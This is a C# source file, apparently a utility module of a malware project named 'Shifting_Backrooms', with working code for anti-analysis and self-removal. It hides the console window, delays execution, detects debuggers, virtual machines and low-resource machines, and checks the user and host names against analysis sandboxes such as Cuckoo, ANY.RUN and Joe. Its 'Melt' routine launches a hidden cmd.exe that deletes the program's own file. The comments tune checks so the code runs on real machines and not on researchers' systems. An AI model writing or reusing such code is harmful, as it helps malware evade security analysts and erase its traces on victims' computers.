// C# | Utils/Security.cs | C# 8.0 | .NET 4.8
// FIX: removed "microsoft" manufacturer check (false positive on Surface/OEM)
// ADDED: CPU core count, uptime, debugger, sandbox username checks

using System;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;

namespace Shifting_Backrooms.Utils
{
    public static class Security
    {
        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll")]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private const int SW_HIDE = 0;

        public static void HideConsole()
        {
            try
            {
                IntPtr hWnd = GetConsoleWindow();
                if (hWnd != IntPtr.Zero) ShowWindow(hWnd, SW_HIDE);
            }
            catch { }
        }

        public static void DelayExecution(int seconds)
        {
            Thread.Sleep(seconds * 1000);
        }

        public static bool IsSandbox()
        {
            try
            {
                // 1. Debugger check
                if (IsDebuggerPresent()) return true;
                bool remoteDbg = false;
                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remoteDbg);
                if (remoteDbg) return true;

                // 2. CPU core count — sandboxes usually get 1-2 cores
                if (Environment.ProcessorCount < 2) return true;

                // 3. RAM — sandboxes often get <2GB
                ulong totalRam = 0;
                using (var searcher = new ManagementObjectSearcher("SELECT Capacity FROM Win32_PhysicalMemory"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                        totalRam += Convert.ToUInt64(obj["Capacity"]);
                }
                if (totalRam < 2UL * 1024 * 1024 * 1024) return true;

                // 4. VM manufacturer check — FIX: removed "microsoft" (false positive)
                using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
                {
                    foreach (ManagementObject item in searcher.Get())
                    {
                        string manufacturer = item["Manufacturer"]?.ToString().ToLower() ?? "";
                        string model = item["Model"]?.ToString().ToLower() ?? "";

                        if (manufacturer.Contains("vmware")) return true;
                        if (manufacturer.Contains("virtualbox")) return true;
                        if (manufacturer.Contains("qemu")) return true;
                        if (manufacturer.Contains("xen")) return true;
                        if (model.Contains("virtual")) return true;
                        if (model.Contains("vmware")) return true;
                    }
                }

                // 5. Sandbox username/hostname tells
                string user = Environment.UserName.ToLower();
                string host = Environment.MachineName.ToLower();
                string[] sandboxTells = { "sandbox", "maltest", "cuckoo", "virus", "malware",
                                          "test", "analysis", "any.run", "joe", "triage" };
                foreach (string tell in sandboxTells)
                    if (user.Contains(tell) || host.Contains(tell)) return true;

                // 6. Uptime check — sandboxes reset fast, uptime < 5min is suspicious
                double uptimeMin = Environment.TickCount / 60000.0;
                if (uptimeMin < 5.0) return true;
            }
            catch { }

            return false;
        }

        public static void Melt()
        {
            try
            {
                string path = Process.GetCurrentProcess().MainModule.FileName;
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + path + "\"",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };
                Process.Start(psi);
                Environment.Exit(0);
            }
            catch { }
        }
    }
}